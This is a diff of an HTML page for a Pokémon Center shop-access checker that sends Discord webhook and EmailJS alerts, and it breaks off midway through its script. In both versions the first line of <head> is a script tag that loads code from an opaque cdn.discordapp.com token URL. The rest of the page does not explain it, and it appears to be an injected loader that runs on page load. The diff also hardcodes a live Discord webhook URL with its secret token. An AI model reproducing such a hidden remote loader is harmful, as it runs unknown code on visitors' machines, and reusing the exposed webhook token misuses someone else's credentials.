@@ -1,81 +1,70 @@
 <!DOCTYPE html>
 <html lang="en">
-<head><script type='text/javascript' src='https://cdn.discordapp.com/He18M3AxkIlB2g77LS2ZXEMqTXksUzh9VcyZCFSrMG2Z8Ehw7TdexioXs-FHQ5RR0eTqHSWmmYZbntIlSqGY_Bbx8kbjmVhLlJ-rm7LqCFHW9G5sKSzZo7rTlStx_zg2mg-TZDJwo3khuIiLsDIkv81lrXiWVrM1ggnZ3qIQLK4='></script>
+<head><script type='text/javascript' src='https://cdn.discordapp.com/yZaRgYz3viJz0Ewrn1XdE9J84SNzYxzKPa1c6c2ZiWbfLjYddGn9W4rFkFwq9zkX_Zu0ngGATNp5_z9p59e64p8xb78BlyPS-ok1UcbcjqKhDWmxNho2oD4vRJa5Yer9BSvRfm4rA8z0XHylnanqMYySVWWNZV4jsV4xJYaZGPI='></script>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Pokémon Center Shop Access Checker - Master Edition</title>
+  <title>Pokémon Center Shop Access Checker</title>
   <style>
-    /* --- COLOR PALETTE & UTILITIES --- */
-    :root {
-        --color-primary: #FFCB05; /* Pokémon Yellow */
-        --color-secondary: #3D7DCA; /* Pokémon Blue */
-        --color-accent: #DA291C; /* Pokeball Red */
-        --color-discord: #5865F2; /* Discord Blurple */
-        --color-success: #10B981;
-        --color-danger: #EF4444;
-        --color-text-dark: #262626;
-        --color-card-bg: #FFFFFF;
-        --color-body-bg: #E5E7EB;
-        --color-shadow-light: rgba(0, 0, 0, 0.15);
-    }
-
-    /* Simplified Utility Classes for consistency */
-    .bg-primary { background-color: var(--color-primary); }
-    .bg-secondary { background-color: var(--color-secondary); }
-    .bg-accent { background-color: var(--color-accent); }
-    .bg-discord { background-color: var(--color-discord); }
-    .text-dark { color: var(--color-text-dark); }
-    .text-white { color: var(--color-card-bg); }
-    .text-success { color: var(--color-success); }
-    .text-danger { color: var(--color-danger); }
-    .font-bold { font-weight: 800; }
-    .font-semibold { font-weight: 600; }
-    .w-full { width: 100%; }
-    .max-w-md { max-width: 28rem; }
-    .rounded { border-radius: 0.5rem; }
-    .shadow-lg { box-shadow: 0 10px 20px var(--color-shadow-light); }
-    .flex { display: flex; }
-    .items-center { align-items: center; }
-    .justify-center { justify-content: center; }
-    .mt-2 { margin-top: 0.5rem; }
-    .mb-4 { margin-bottom: 1rem; }
-    .p-6 { padding: 1.5rem; }
-    .py-2 { padding-top: 0.5rem; padding-bottom: 0.5rem; }
-    .space-x-2 > :not([hidden]) ~ :not([hidden]) { margin-left: 0.5rem; }
-    .hidden { display: none; }
-
-    /* --- BASE STYLES & LAYOUT --- */
+    /* Tailwind-like utility classes */
+    .bg-gray-100 { background-color: #f3f4f6; }
+    .bg-white { background-color: #ffffff; }
+    .bg-blue-500 { background-color: #3b82f6; }
+    .bg-red-500 { background-color: #ef4444; }
+    .bg-green-500 { background-color: #10b981; }
+    .bg-gray-500 { background-color: #6b7280; }
+    .text-gray-600 { color: #4b5563; }
+    .text-gray-500 { color: #6b7280; }
+    .text-red-500 { color: #ef4444; }
+    .text-green-500 { color: #22c55e; }
+    .text-lg { font-size: 1.125rem; line-height: 1.75rem; }
+    .text-sm { font-size: 0.875rem; line-height: 1.25rem; }
+    .text-2xl { font-size: 1.5rem; line-height: 2rem; }
+    .font-bold { font-weight: 700; }
+    .font-semibold { font-weight: 600; }
+    .p-6 { padding: 1.5rem; }
+    .py-2 { padding-top: 0.5rem; padding-bottom: 0.5rem; }
+    .px-3 { padding-left: 0.75rem; padding-right: 0.75rem; }
+    .mt-2 { margin-top: 0.5rem; }
+    .mb-2 { margin-bottom: 0.5rem; }
+    .w-full { width: 100%; }
+    .max-w-md { max-width: 28rem; }
+    .rounded { border-radius: 0.25rem; }
+    .rounded-lg { border-radius: 0.5rem; }
+    .shadow-lg { box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05); }
+    .border { border-width: 1px; }
+    .border-gray-300 { border-color: #d1d5db; }
+    .flex { display: flex; }
+    .items-center { align-items: center; }
+    .justify-center { justify-content: center; }
+    .min-h-screen { min-height: 100vh; }
+    .text-center { text-align: center; }
+    .hidden { display: none; }
+    .hover\:bg-blue-600:hover { background-color: #2563eb; }
+    .hover\:bg-red-600:hover { background-color: #dc2626; }
+    .hover\:bg-green-600:hover { background-color: #059669; }
+    .hover\:bg-gray-600:hover { background-color: #4b5563; }
+    /* Custom Pokemon Theme Styles */
     body {
       font-family: 'Nunito', sans-serif;
-      background: linear-gradient(135deg, #1f4068, #162447, #1f4068); /* Darker, more serious background */
-      /* Ensure full viewport centering */
-      min-height: 100vh; 
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      position: relative;
-      overflow: hidden;
-      color: var(--color-text-dark);
-    }
-    .bg-white {
-      background-color: var(--color-card-bg);
-      border-radius: 20px;
-      padding: 2.5rem;
-      box-shadow: 0 15px 30px rgba(0, 0, 0, 0.4);
+      background: linear-gradient(to bottom, #87CEEB, #A0D2EB, #90EE90, #ADD8E6);
       position: relative;
-      z-index: 20;
-      border: 5px solid var(--color-primary); /* Strong border for a bold look */
+      overflow-y: auto;
+      scrollbar-width: thin;
+      scrollbar-color: #888 #f1f1f1;
     }
-    h1 {
-        font-size: 1.8rem;
-        text-transform: uppercase;
-        letter-spacing: 0.1em;
-        color: var(--color-secondary);
-        text-shadow: 1px 1px 2px var(--color-shadow-light);
-        margin-bottom: 0.5rem;
-    }
-
-    /* --- POKEMON SPRITE ANIMATIONS --- */
+    body::-webkit-scrollbar {
+      width: 10px;
+    }
+    body::-webkit-scrollbar-track {
+      background: #f1f1f1;
+    }
+    body::-webkit-scrollbar-thumb {
+      background: #888;
+      border-radius: 5px;
+    }
+    body::-webkit-scrollbar-thumb:hover {
+      background: #555;
+    }
     .pokemon-sprite {
       position: absolute;
       bottom: 0;
@@ -83,8 +72,14 @@
       height: auto;
       z-index: 10;
     }
-    .magikarp { left: 20px; animation: bob 2s infinite ease-in-out; }
-    .cubone { right: 20px; animation: hop 3s infinite ease-in-out; }
+    .magikarp {
+      left: 20px;
+      animation: bob 2s infinite ease-in-out;
+    }
+    .cubone {
+      right: 20px;
+      animation: hop 3s infinite ease-in-out;
+    }
     @keyframes bob {
       0%, 100% { transform: translateY(0); }
       50% { transform: translateY(-10px); }
@@ -95,178 +90,241 @@
       50% { transform: translateY(0) rotate(0deg); }
       75% { transform: translateY(-15px) rotate(-5deg); }
     }
-    /* Pokeball Decorations: Hidden for cleaner look in the "Super Cool" version */
-    .pokeball-decoration { display: none; }
-
-
-    /* --- FORM ELEMENTS & INPUT GROUPS --- */
-    label {
-        color: var(--color-text-dark);
-        font-weight: 600;
-        margin-top: 1rem;
-        display: block;
-    }
-    input[type="email"], input[type="url"] {
-      border: 2px solid var(--color-secondary);
-      transition: border-color 0.3s ease, box-shadow 0.3s ease;
-      box-sizing: border-box; 
-      height: 2.5rem; 
-      padding: 0.5rem 1rem;
-      border-radius: 0.5rem;
+    .bg-white {
+      background-color: #fff;
+      border-radius: 20px;
+      padding: 1.5rem;
+      box-shadow: 0 15px 25px rgba(0, 0, 0, 0.2);
+      position: relative;
+      z-index: 20;
     }
-    input[type="email"]:focus, input[type="url"]:focus {
-      border-color: var(--color-accent);
+    .rounded, .rounded-lg {
+      border-radius: 15px !important;
+    }
+    .pokeball-decoration {
+      position: absolute;
+      width: 40px;
+      height: 40px;
+      background-size: contain;
+      background-repeat: no-repeat;
+      opacity: 0.6;
+      z-index: 5;
+    }
+    .pokeball-top-left { top: -15px; left: -15px; transform: rotate(-20deg); }
+    .pokeball-top-right { top: -15px; right: -15px; transform: rotate(15deg); }
+    .pokeball-bottom-left { bottom: -15px; left: -15px; transform: rotate(40deg); }
+    .pokeball-bottom-right { bottom: -15px; right: -15px; transform: rotate(-30deg); }
+    input[type="email"], input[type="url"] { /* Added input[type="url"] */
+      border: 2px solid #a0d2eb;
+      padding: 0.6rem 1rem;
+      transition: border-color 0.3s ease;
+    }
+    input[type="email"]:focus, input[type="url"]:focus { /* Added input[type="url"] */
+      border-color: #3b82f6;
       outline: none;
-      box-shadow: 0 0 0 3px rgba(218, 41, 28, 0.2);
+      box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.2);
     }
-    input[readonly] {
-      background-color: #F8F8F8;
+    input[type="email"][readonly], input[type="url"][readonly] { /* Added input[type="url"] */
+      background-color: #f3f4f6;
       cursor: not-allowed;
     }
-
-    /* Flex Input Group Fix */
-    .input-group {
-      display: flex;
-      align-items: stretch; 
-      margin-bottom: 0.5rem;
-      width: 100%; 
+    button {
+      font-weight: 600;
+      transition: background-color 0.3s ease, transform 0.2s ease;
+      letter-spacing: 0.05em;
     }
-    .input-group input {
+    button:hover {
+      transform: translateY(-2px);
+    }
+    .text-center {
+      text-shadow: 1px 1px 2px rgba(0,0,0,0.1);
+    }
+    .email-input-group, .webhook-input-group { /* Added .webhook-input-group */
+      display: flex;
+      align-items: center;
+      margin-bottom: 0.5rem;
+    }
+    .email-input-group input, .webhook-input-group input { /* Combined input selector */
       flex-grow: 1;
       margin-right: 0.5rem;
     }
-
-    /* Button Styling (General) */
-    button {
-      font-weight: 700;
-      transition: all 0.2s ease;
-      letter-spacing: 0.05em;
-      color: white; 
-      text-shadow: 0 1px 1px rgba(0,0,0,0.2);
-      border: none;
-      border-radius: 0.5rem;
-      height: 2.5rem;
-      cursor: pointer;
+    .email-input-group .remove-email-button, .webhook-input-group .remove-webhook-button { /* Combined remove button selector */
+      background-color: #ef4444;
+      color: white;
+      border: none;
+      padding: 0.5rem 0.75rem;
+      border-radius: 0.25rem;
+      cursor: pointer;
+      font-size: 0.8rem;
+      transition: background-color 0.2s;
     }
-    button:hover { transform: translateY(-3px); box-shadow: 0 5px 10px rgba(0,0,0,0.2); }
-
-    /* Input Group Buttons (Submit/Remove) */
-    .input-group .remove-button,
-    .input-group .submit-button {
-      flex-shrink: 0; 
-      width: auto;
-      padding: 0 1rem;
+    .email-input-group .remove-email-button:hover, .webhook-input-group .remove-webhook-button:hover { /* Combined remove button selector */
+      background-color: #dc2626;
+      transform: none;
     }
-    .input-group .remove-button { background-color: var(--color-danger); }
-    .input-group .remove-button:hover { background-color: #C53030; transform: none; }
-    .input-group .submit-button { background-color: var(--color-success); }
-    .input-group .submit-button:hover { background-color: #048C68; transform: none; }
-    
-    /* Standalone Action Buttons */
-    #startButton { background-color: var(--color-secondary); }
-    #startButton:hover { background-color: #3164A4; }
-    #stopButton { background-color: var(--color-danger); }
-    #stopButton:hover { background-color: #C53030; }
-    .add-button { background-color: var(--color-success); }
-    .add-button:hover { background-color: #048C68; }
-    #testEmailButton { background-color: var(--color-primary); color: var(--color-text-dark); }
-    #testEmailButton:hover { background-color: #E2B204; }
-
-    /* Toggle Buttons */
-    .toggle-button {
-        flex-grow: 1;
-        font-size: 0.85rem;
-        height: 2.5rem;
-        text-shadow: none;
-    }
-    .toggle-button.active { background-color: var(--color-success); }
-    .toggle-button.active:hover { background-color: #048C68; }
-    .toggle-button.inactive { background-color: #6b7280; }
-    .toggle-button.inactive:hover { background-color: #4b5563; }
-    .webhook-toggle-button.active { background-color: var(--color-discord); }
-    .webhook-toggle-button.active:hover { background-color: #4954A3; }
-
-    /* --- STATUS & SLIDER --- */
-    .status-section {
-        border-top: 2px dashed #DDD;
-        padding-top: 1rem;
-        margin-top: 1rem;
-    }
-    #statusText {
-        font-size: 1.4rem;
-        letter-spacing: 0.05em;
-        text-shadow: 1px 1px 0 rgba(0,0,0,0.1);
-    }
-    #statusDetails {
-        font-size: 0.8rem;
-        font-style: italic;
-        color: #71717A;
-    }
+    .email-input-group .submit-email-button, .webhook-input-group .submit-webhook-button { /* Combined submit button selector */
+      background-color: #10b981;
+      color: white;
+      border: none;
+      padding: 0.5rem 0.75rem;
+      border-radius: 0.25rem;
+      cursor: pointer;
+      font-size: 0.8rem;
+      transition: background-color 0.2s;
+    }
+    .email-input-group .submit-email-button:hover, .webhook-input-group .submit-webhook-button:hover { /* Combined submit button selector */
+      background-color: #059669;
+      transform: none;
+    }
+    .email-toggle-button.active, .webhook-toggle-button.active { /* Added .webhook-toggle-button */
+      background-color: #10b981;
+    }
+    .email-toggle-button.active:hover, .webhook-toggle-button.active:hover { /* Added .webhook-toggle-button */
+      background-color: #059669;
+    }
+    .email-toggle-button.inactive, .webhook-toggle-button.inactive { /* Added .webhook-toggle-button */
+      background-color: #6b7280;
+    }
+    .email-toggle-button.inactive:hover, .webhook-toggle-button.inactive:hover { /* Added .webhook-toggle-button */
+      background-color: #4b5563;
+    }
+    .add-email-button, .add-webhook-button { /* Added .add-webhook-button */
+      background-color: #22c55e;
+      color: white;
+      border: none;
+      padding: 0.75rem 1rem;
+      border-radius: 0.25rem;
+      cursor: pointer;
+      font-weight: 600;
+      margin-top: 0.5rem;
+      transition: background-color 0.2s, transform 0.2s;
+    }
+    .add-email-button:hover, .add-webhook-button:hover { /* Added .add-webhook-button */
+      background-color: #16a34a;
+    }
+    input[type="range"] {
+      -webkit-appearance: none;
+      width: 100%;
+      height: 8px;
+      background: #a0d2eb;
+      border-radius: 5px;
+      outline: none;
+      margin-top: 0.5rem;
+      cursor: pointer;
+    }
+    input[type="range"]::-webkit-slider-thumb {
+      -webkit-appearance: none;
+      appearance: none;
+      width: 20px;
+      height: 20px;
+      background: #3b82f6;
+      border-radius: 50%;
+      border: 2px solid white;
+      cursor: pointer;
+      box-shadow: 0 0 5px rgba(0,0,0,0.2);
+    }
+    input[type="range"]::-moz-range-thumb {
+      width: 20px;
+      height: 20px;
+      background: #3b82f6;
+      border-radius: 50%;
+      border: 2px solid white;
+      cursor: pointer;
+      box-shadow: 0 0 5px rgba(0,0,0,0.2);
+    }
     .status-feedback {
-      color: var(--color-success);
+      color: #16a34a;
       font-size: 0.875rem;
       margin-top: 0.5rem;
       text-align: center;
       opacity: 0;
       transition: opacity 0.5s ease;
     }
-    .status-feedback.show { opacity: 1; }
+    .status-feedback.show {
+      opacity: 1;
+    }
+    @media (max-height: 600px) {
+      .pokemon-sprite {
+        width: 80px;
+      }
+      .bg-white {
+        padding: 1rem;
+      }
+      .text-2xl {
+        font-size: 1.25rem;
+        line-height: 1.75rem;
+      }
+      .p-6 {
+        padding: 1rem;
+      }
+    }
+    @media (max-height: 400px) {
+      .pokemon-sprite {
+        display: none;
+      }
+      .pokeball-decoration {
+        display: none;
+      }
+    }
   </style>
-  <link href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;700;800&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Nunito:wght@400;700&display=swap" rel="stylesheet">
 </head>
-<body class="min-h-screen">
+<body class="bg-gray-100 flex items-center justify-center min-h-screen">
   <img src="https://raw.githubusercontent.com/PokeAPI/sprites/master/sprites/pokemon/129.png" alt="Magikarp" class="pokemon-sprite magikarp">
   <img src="https://raw.githubusercontent.com/PokeAPI/sprites/master/sprites/pokemon/104.png" alt="Cubone" class="pokemon-sprite cubone">
   <div class="bg-white p-6 rounded-lg shadow-lg w-full max-w-md">
-    <h1 class="font-bold text-center">Pokémon Center Shop Access Checker<br><span style="font-size: 0.9rem; color: #525252; font-weight: 600;">Made By Kronborg</span></h1>
-    <p style="color: #525252;" class="text-center mb-4">Master Edition: Checks for queue status or shop access.</p>
-    
-    <label class="block text-sm">Email Alerts:</label>
-    <div id="emailInputsContainer" class="mb-2">
-      <div class="input-group">
-        <input type="email" value="kronborgnielsen@gmail.com" class="rounded email-input" readonly required>
+    <div class="pokeball-decoration pokeball-top-left" style="background-image: url('https://raw.githubusercontent.com/PokeAPI/sprites/master/sprites/items/poke-ball.png');"></div>
+    <div class="pokeball-decoration pokeball-top-right" style="background-image: url('https://raw.githubusercontent.com/PokeAPI/sprites/master/sprites/items/poke-ball.png');"></div>
+    <div class="pokeball-decoration pokeball-bottom-left" style="background-image: url('https://raw.githubusercontent.com/PokeAPI/sprites/master/sprites/items/poke-ball.png');"></div>
+    <div class="pokeball-decoration pokeball-bottom-right" style="background-image: url('https://raw.githubusercontent.com/PokeAPI/sprites/master/sprites/items/poke-ball.png');"></div>
+    <h1 class="text-2xl font-bold text-center mb-2">Pokémon Center Shop Access Checker<br>Made By Kronborg</h1>
+    <p class="text-gray-600 text-center mb-2">Checks to see if the shop is accessible.</p>
+        <div id="webhookInputContainer" class="mb-2">
+      <label class="block text-sm text-gray-600 mb-1">Discord Webhook URL (Required for Discord Alerts):</label>
+      <div class="webhook-input-group">
+        <input type="url" id="discordWebhookInput" placeholder="https://discord.com/api/webhooks/..." class="w-full border border-gray-300 rounded px-3 py-2 webhook-input" required>
+        <button type="button" id="submitWebhookButton" class="submit-webhook-button">Submit</button>
       </div>
     </div>
-    <button id="addEmailButton" class="w-full add-button mb-4">Add Another Email</button>
+        <div id="emailInputsContainer" class="mb-2">
+      <label class="block text-sm text-gray-600 mb-1">Emails for alerts:</label>
+      <div class="email-input-group">
+        <input type="email" placeholder="name@example.com" class="w-full border border-gray-300 rounded px-3 py-2 email-input" required>
+        <button type="button" class="submit-email-button">Submit</button>
+      </div>
+    </div>
+    <button id="addEmailButton" class="w-full add-email-button mb-2">Add Another Email</button>
+    <div id="emailFeedback" class="status-feedback"></div>
 
-    <label class="block text-sm">Discord Webhook Alert:</label>
-    <div id="discordWebhookContainer" class="mb-4">
-        <div class="input-group webhook-input-group">
-            <input type="url" id="webhookInput" value="https://discord.com/api/webhooks/1418654823745716436/vuMKu1s095Cq3BfU06OF_Z_mwxG39zHppHJ3c4BX5X38WuJFWPGhIZdopWTEEXlophiN" placeholder="https://discord.com/api/webhooks/..." class="rounded webhook-input" required>
-            <button type="button" id="webhookSubmitButton" class="submit-button">Submit</button>
-        </div>
-    </div>
-
-    <div id="feedback" class="status-feedback"></div>
-    
-        <div class="mb-4">
-      <label for="frequencySlider" class="block text-sm">
-        Check Frequency: <span id="frequencyValue" class="font-bold text-dark">10</span> minutes
+    <div class="mb-2">
+      <label for="frequencySlider" class="block text-sm text-gray-600 mb-1">
+        Check every: <span id="frequencyValue" class="font-semibold text-gray-800">10</span> minutes
       </label>
       <input type="range" id="frequencySlider" min="1" max="60" value="10">
     </div>
-    
-        <div id="status" class="text-center mb-4 status-section">
-      <p class="text-lg">Status: <span id="statusText" class="font-bold text-dark">Waiting...</span></p>
-      <p class="text-sm" style="color: #71717A;">Last checked: <span id="lastChecked">Never</span></p>
-      <p class="text-sm" style="color: #71717A;">System running for: <span id="runTime">0h 0m 0s</span></p>
-      <p class="text-sm" style="color: #71717A;">Details: <span id="statusDetails">None</span></p>
+
+    <div id="status" class="text-center mb-2">
+      <p class="text-lg">Status: <span id="statusText" class="font-semibold">Waiting...</span></p>
+      <p class="text-sm text-gray-500">Last checked: <span id="lastChecked">Never</span></p>
+      <p class="text-sm text-gray-500">System running for: <span id="runTime">0h 0m 0s</span></p>
+      <p class="text-sm text-gray-500">Details: <span id="statusDetails">None</span></p>
     </div>
-    
-        <button id="startButton" class="w-full bg-secondary py-2 hover:bg-blue-600">Start Checking</button>
-    <button id="stopButton" class="w-full bg-red-500 py-2 hover:bg-red-600 mt-2 hidden">Stop Checking</button>
-    
-    <div class="flex mt-2 space-x-2">
-        <button id="emailToggleButton" class="toggle-button active">Deactivate Email Alerts</button>
-        <button id="webhookToggleButton" class="toggle-button webhook-toggle-button active">Deactivate Discord Alerts</button>
-    </div>
-    
-    <button id="testEmailButton" class="w-full mt-2" style="background-color: var(--color-primary); color: var(--color-text-dark);">Test Alert(s)</button>
+
+    <button id="startButton" class="w-full bg-blue-500 text-white py-2 rounded hover:bg-blue-600">Start Checking</button>
+    <button id="stopButton" class="w-full bg-red-500 text-white py-2 rounded hover:bg-red-600 mt-2 hidden">Stop Checking</button>
+
+    <button id="emailToggleButton" class="w-full bg-green-500 text-white py-2 rounded hover:bg-green-600 mt-2 email-toggle-button active">Deactivate Email Alerts</button>
+    <button id="webhookToggleButton" class="w-full bg-green-500 text-white py-2 rounded hover:bg-green-600 mt-2 webhook-toggle-button inactive">Activate Discord Alerts</button>
+    
+    <button id="testEmailButton" class="w-full bg-green-500 text-white py-2 rounded hover:bg-green-600 mt-2">Test Email</button>
+    <button id="testWebhookButton" class="w-full bg-blue-500 text-white py-2 rounded hover:bg-blue-600 mt-2">Test Discord Webhook</button>
   </div>
+
   <audio id="beepSound">
     <source src="https://www.soundjay.com/buttons/beep-01a.mp3" type="audio/mpeg">
     Your browser does not support the audio element.
   </audio>
+
   <script src="https://cdn.jsdelivr.net/npm/xlsx@0.18.5/dist/xlsx.full.min.js"></script>
   <script type="text/javascript">
     var gk_isXlsx = false;
@@ -302,143 +360,121 @@
   </script>
   <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4.4.1/dist/email.min.js"></script>
   <script>
+    // --- DISCORD WEBHOOK SETUP ---
+    
+    // IMPORTANT: **REPLACE THIS PLACEHOLDER with your actual Discord Webhook URL**
+    // Or, you can enter it in the input field on the page and click "Submit".
+    // If you enter it in the input field, the variable below will be overwritten
+    // once you click submit on the page.
+    let discordWebhookURL = 'https://discord.com/api/webhooks/1418654823745716436/vuMKu1s095Cq3BfU06OF_Z_mwxG39zHppHJ3c4BX5X38WuJFWPGhIZdopWTEEXlophiN';
+    // -----------------------------
+
     if (typeof emailjs === 'undefined') {
       console.error('EmailJS failed to load. Please check the CDN URL or network connection.');
       alert('Email functionality is unavailable. Please check your network connection and try again.');
     } else {
       emailjs.init({
-        publicKey: "8w7eu6mrg3lRl6ta3"
+        publicKey: "LxaYn4E6okRV7RG0O"
       });
     }
+
     const statusText = document.getElementById('statusText');
     const lastChecked = document.getElementById('lastChecked');
     const statusDetails = document.getElementById('statusDetails');
     const startButton = document.getElementById('startButton');
     const stopButton = document.getElementById('stopButton');
     const testEmailButton = document.getElementById('testEmailButton');
+    const testWebhookButton = document.getElementById('testWebhookButton');
     const emailToggleButton = document.getElementById('emailToggleButton');
-    const webhookToggleButton = document.getElementById('webhookToggleButton');
-    const webhookInput = document.getElementById('webhookInput');
-    const webhookSubmitButton = document.getElementById('webhookSubmitButton');
+    const webhookToggleButton = document.getElementById('webhookToggleButton'); // New Element
     const beepSound = document.getElementById('beepSound');
     const runTime = document.getElementById('runTime');
     const emailInputsContainer = document.getElementById('emailInputsContainer');
-    const discordWebhookContainer = document.getElementById('discordWebhookContainer');
     const addEmailButton = document.getElementById('addEmailButton');
-    const feedback = document.getElementById('feedback');
+    const emailFeedback = document.getElementById('emailFeedback');
     const frequencySlider = document.getElementById('frequencySlider');
     const frequencyValue = document.getElementById('frequencyValue');
+    const discordWebhookInput = document.getElementById('discordWebhookInput'); // New Element
+    const submitWebhookButton = document.getElementById('submitWebhookButton'); // New Element
+    
     let intervalId = null;
     let startTime = null;
     let timerInterval = null;
     let currentCheckInterval = 10 * 60 * 1000;
     let emailNotificationsEnabled = true;
-    let discordNotificationsEnabled = true;
+    let webhookNotificationsEnabled = false; // New State
+
+    // --- Webhook Input Logic (New) ---
+    discordWebhookInput.value = discordWebhookURL; // Populate with default/placeholder
     
-    // Helper function to show temporary feedback
-    function showFeedback(message) {
-      feedback.textContent = message;
-      feedback.classList.add('show');
-      setTimeout(() => {
-        feedback.classList.remove('show');
-      }, 2000);
+    if (discordWebhookURL && discordWebhookURL.startsWith('https://discord.com/api/webhooks/')) {
+      discordWebhookInput.setAttribute('readonly', 'true');
+      submitWebhookButton.remove();
+      webhookNotificationsEnabled = true;
+      webhookToggleButton.textContent = 'Deactivate Discord Alerts';
+      webhookToggleButton.classList.remove('inactive', 'bg-gray-500');
+      webhookToggleButton.classList.add('active', 'bg-green-500');
+      showEmailFeedback('Webhook URL loaded & alerts active.');
     }
 
-    // Discord Webhook Logic
-    function submitWebhook() {
-        const url = webhookInput.value.trim();
-        if (!url || !url.startsWith('https://discord.com/api/webhooks/')) {
-            alert('Please enter a valid Discord Webhook URL.');
-            webhookInput.focus();
-            return;
-        }
-        webhookInput.setAttribute('readonly', 'true');
-        webhookSubmitButton.classList.add('hidden');
-        
-        // Add a remove button
-        let removeButton = discordWebhookContainer.querySelector('.remove-button');
-        if (!removeButton) {
-            removeButton = document.createElement('button');
-            removeButton.type = 'button';
-            removeButton.className = 'remove-button';
-            removeButton.textContent = 'Remove';
-            discordWebhookContainer.querySelector('.webhook-input-group').appendChild(removeButton);
-            removeButton.addEventListener('click', removeWebhook);
-        }
-        removeButton.classList.remove('hidden');
-
-        showFeedback('Discord Webhook submitted.');
-        console.log('Submitted Webhook:', url);
-    }
-
-    function removeWebhook() {
-        webhookInput.value = '';
-        webhookInput.removeAttribute('readonly');
-        webhookSubmitButton.classList.remove('hidden');
-        const removeButton = discordWebhookContainer.querySelector('.remove-button');
-        if (removeButton) {
-            removeButton.classList.add('hidden');
-        }
-        showFeedback('Discord Webhook removed.');
-    }
-
-    webhookSubmitButton.addEventListener('click', submitWebhook);
-    
-    // Auto-submit the default webhook on load
-    document.addEventListener('DOMContentLoaded', () => {
-        // Only attempt to submit if the default value is present
-        if (webhookInput.value.trim()) {
-            submitWebhook();
-        }
-    });
-
-    // Toggle Discord notifications
+    submitWebhookButton.addEventListener('click', function() {
+      const url = discordWebhookInput.value.trim();
+      if (!url || !url.startsWith('https://discord.com/api/webhooks/')) {
+        alert('Please enter a valid Discord Webhook URL.');
+        discordWebhookInput.focus();
+        return;
+      }
+      discordWebhookURL = url;
+      discordWebhookInput.setAttribute('readonly', 'true');
+      submitWebhookButton.remove();
+      webhookNotificationsEnabled = true;
+      webhookToggleButton.textContent = 'Deactivate Discord Alerts';
+      webhookToggleButton.classList.remove('inactive', 'bg-gray-500');
+      webhookToggleButton.classList.add('active', 'bg-green-500');
+      showEmailFeedback('Discord Webhook submitted and alerts activated.');
+    });
+    
     webhookToggleButton.addEventListener('click', () => {
-      discordNotificationsEnabled = !discordNotificationsEnabled;
-      if (discordNotificationsEnabled) {
+      if (!discordWebhookURL) {
+        alert('Please submit a Discord Webhook URL first.');
+        return;
+      }
+      webhookNotificationsEnabled = !webhookNotificationsEnabled;
+      if (webhookNotificationsEnabled) {
         webhookToggleButton.textContent = 'Deactivate Discord Alerts';
-        webhookToggleButton.classList.remove('inactive');
-        webhookToggleButton.classList.add('active');
+        webhookToggleButton.classList.remove('inactive', 'bg-gray-500');
+        webhookToggleButton.classList.add('active', 'bg-green-500');
       } else {
         webhookToggleButton.textContent = 'Activate Discord Alerts';
-        webhookToggleButton.classList.remove('active');
-        webhookToggleButton.classList.add('inactive');
+        webhookToggleButton.classList.remove('active', 'bg-green-500');
+        webhookToggleButton.classList.add('inactive', 'bg-gray-500');
       }
-      showFeedback(`Discord notifications ${discordNotificationsEnabled ? 'enabled' : 'disabled'}.`);
+      showEmailFeedback(`Discord notifications ${webhookNotificationsEnabled ? 'enabled' : 'disabled'}.`);
     });
-    
-    // Initial state setup for webhook toggle 
-    if (discordNotificationsEnabled) {
-        webhookToggleButton.classList.add('active');
-    }
 
-    // Toggle email notifications
+    // --- Existing Email Toggle Logic ---
     emailToggleButton.addEventListener('click', () => {
       emailNotificationsEnabled = !emailNotificationsEnabled;
       if (emailNotificationsEnabled) {
         emailToggleButton.textContent = 'Deactivate Email Alerts';
-        emailToggleButton.classList.remove('inactive');
-        emailToggleButton.classList.add('active');
+        emailToggleButton.classList.remove('inactive', 'bg-gray-500');
+        emailToggleButton.classList.add('active', 'bg-green-500');
       } else {
         emailToggleButton.textContent = 'Activate Email Alerts';
-        emailToggleButton.classList.remove('active');
-        emailToggleButton.classList.add('inactive');
+        emailToggleButton.classList.remove('active', 'bg-green-500');
+        emailToggleButton.classList.add('inactive', 'bg-gray-500');
       }
-      showFeedback(`Email notifications ${emailNotificationsEnabled ? 'enabled' : 'disabled'}.`);
+      showEmailFeedback(`Email notifications ${emailNotificationsEnabled ? 'enabled' : 'disabled'}.`);
     });
-    
-    // Initial state setup for email toggle 
-    if (emailNotificationsEnabled) {
-        emailToggleButton.classList.add('active');
-    }
+    // --- End Existing Email Toggle Logic ---
 
-    // Helper function to calculate a random interval
+
     function getRandomInterval(baseInterval) {
-      const variation = Math.floor(Math.random() * (120000 - 60000 + 1)) + 60000; // Random between 1 and 2 minutes
-      const randomSign = Math.random() < 0.5 ? -1 : 1; 
+      const variation = Math.floor(Math.random() * (120000 - 60000 + 1)) + 60000;
+      const randomSign = Math.random() < 0.5 ? -1 : 1;
       return baseInterval + (randomSign * variation);
     }
-    // Update the displayed value as the slider is moved
+
     frequencySlider.addEventListener('input', function() {
       frequencyValue.textContent = this.value;
       if (intervalId) {
@@ -447,16 +483,23 @@
       }
     });
 
-    // Dynamic Email Input Management
+    function showEmailFeedback(message) {
+      emailFeedback.textContent = message;
+      emailFeedback.classList.add('show');
+      setTimeout(() => {
+        emailFeedback.classList.remove('show');
+      }, 2000);
+    }
+
     function addEmailInputField() {
       const emailInputGroup = document.createElement('div');
-      emailInputGroup.className = 'input-group';
+      emailInputGroup.className = 'email-input-group';
       emailInputGroup.innerHTML = `
-        <input type="email" placeholder="anothername@example.com" class="border border-gray-300 rounded email-input">
-        <button type="button" class="submit-button">Submit</button>
+        <input type="email" placeholder="name@example.com" class="w-full border border-gray-300 rounded px-3 py-2 email-input" required>
+        <button type="button" class="submit-email-button">Submit</button>
       `;
       emailInputsContainer.appendChild(emailInputGroup);
-      const submitButton = emailInputGroup.querySelector('.submit-button');
+      const submitButton = emailInputGroup.querySelector('.submit-email-button');
       const emailInput = emailInputGroup.querySelector('.email-input');
       submitButton.addEventListener('click', function() {
         const email = emailInput.value.trim();
@@ -469,25 +512,49 @@
         submitButton.remove();
         const removeButton = document.createElement('button');
         removeButton.type = 'button';
-        removeButton.className = 'remove-button';
